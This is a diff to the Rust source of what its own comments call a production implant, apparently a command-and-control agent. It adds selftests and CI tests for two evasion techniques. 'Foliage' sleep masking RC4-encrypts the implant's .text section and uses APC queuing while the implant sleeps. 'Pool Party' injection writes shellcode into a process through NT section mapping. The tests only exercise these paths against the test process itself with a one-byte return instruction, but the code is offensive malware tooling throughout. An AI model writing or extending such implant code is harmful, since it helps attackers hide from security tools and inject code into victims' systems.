@@ -2394,11 +2394,11 @@ pub unsafe extern "system" fn nyx_selftest_foliage() {
 pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
     let mut mask: u32 = 0;
     crate::sleep::set_foliage_enabled(true);
-    // P4: force the APC gate ON for this selftest (otherwise it defaults OFF
-    // via NYX_FOLIAGE_APC_ON and execute_foliage_plan runs the data-only floor,
-    // never setting FOLIAGE_APC_OK=1). Restore on exit so the build-time
-    // default is respected outside this selftest.
+    // P4: force the APC gate ON + wire the PIC thunk for this selftest
+    // (otherwise both default OFF and foliage_helper runs the data-only floor,
+    // never setting FOLIAGE_APC_OK=1). Restore on exit.
     let prev_apc = crate::sleep::set_foliage_apc_enabled(true);
+    let prev_wired = crate::sleep::set_foliage_apc_thunk_wired(true);
     crate::sleep::sleep(2); // 2s window: helper masks .text, queues APC, unmasks
     mask |= 1 << 0; // reached the exit → no crash (image survived)
     let st = crate::sleep::foliage_apc_status();
@@ -2411,6 +2411,7 @@ pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
     // Encode stage bitmask into upper byte: mask |= (stage as u32) << 8.
     // Bits 8-14 = FOLIAGE_STAGE bitmask (which stage got to before failure).
     mask |= (stage as u32) << 8;
+    crate::sleep::set_foliage_apc_thunk_wired(prev_wired);
     crate::sleep::set_foliage_apc_enabled(prev_apc);
     crate::sleep::set_foliage_enabled(false);
     unsafe { exit(mask) };
@@ -2812,4 +2813,77 @@ pub unsafe extern "system" fn nyx_selftest_resolve_forwarder() {
     }
 
     exit(mask);
+}
+
+
+// ============================================================================
+// #[cfg(test)] CI wrappers for hosted Windows runner
+// ============================================================================
+// These wrappers call the internal functions (not the #[no_mangle] exports) so
+// `cargo test` on a hosted Windows runner can exercise the same code paths.
+// Each wrapper:
+//   - checks the runtime gate and skips if off (respecting defaults)
+//   - asserts on diagnostic atomics or the function return value.
+// Production implant remains #![no_std]; these only compile in test mode.
+
+#[cfg(all(test, target_os = "windows"))]
+mod ci_tests {
+    /// P4 data-only Foliage: arm mask, sleep 1s, verify no crash.
+    #[test]
+    fn ci_foliage_data_only_survives_one_cycle() {
+        if !crate::sleep::foliage_enabled() {
+            eprintln!("skipped: FOLIAGE_ENABLED off");
+            return;
+        }
+        // One 1s sleep through the Foliage data-only path. If this returns,
+        // the mask/unmask round-trip didn't corrupt the running image.
+        crate::sleep::sleep(1);
+        // Pass = reached this line without crash.
+    }
+
+    /// P4 Foliage APC: exercise the full APC chain (PIC thunk + .text RC4).
+    /// Expects FOLIAGE_APC_OK > 0 after a 2s sleep cycle.
+    #[test]
+    fn ci_foliage_apc_survives_one_cycle() {
+        if !crate::sleep::foliage_apc_enabled() {
+            eprintln!("skipped: FOLIAGE_APC_ENABLED off");
+            return;
+        }
+        // Wire the PIC thunk — without this, foliage_helper degrades to the
+        // data-only floor and FOLIAGE_APC_OK stays 0 (this test exists to
+        // validate the thunk path on CI, not the data-only fallback).
+        let prev_wired = crate::sleep::set_foliage_apc_thunk_wired(true);
+        // 2s window: helper builds thunk, masks .text, queues APC, unmasks.
+        crate::sleep::sleep(2);
+        let status = crate::sleep::foliage_apc_status();
+        let stage = crate::sleep::foliage_stage();
+        crate::sleep::set_foliage_apc_thunk_wired(prev_wired);
+        if status == 0 {
+            eprintln!("FOLIAGE_APC_OK={} FOLIAGE_STAGE={:#x}", status, stage);
+        }
+        assert!(
+            status > 0,
+            "Foliage APC chain did not complete — FOLIAGE_APC_OK={} STAGE={:#x}",
+            status, stage
+        );
+    }
+
+    /// P5 Pool Party: section delivery to self. Validates the NT section
+    /// create → map → write path without a remote process. The worker-queue
+    /// splice (step 6d) returns Err (not yet implemented), but CI verifies
+    /// the section machinery doesn't panic.
+    #[test]
+    fn ci_pool_party_section_delivery_to_self() {
+        if !crate::tp::pool_party_enabled() {
+            eprintln!("skipped: POOL_PARTY_ENABLED off");
+            return;
+        }
+        // Single-byte ret shellcode — safest probe for the section path.
+        let shellcode: [u8; 1] = [0xC3];
+        let pid = std::process::id();
+        // pool_party_inject returns Err (splice not yet implemented), but CI
+        // validates the section create/map/write path doesn't panic.
+        let _ = unsafe { crate::tp::pool_party_inject(pid, &shellcode) };
+        // Pass = didn't crash through NtCreateSection→NtMapViewOfSection→write.
+    }
 }
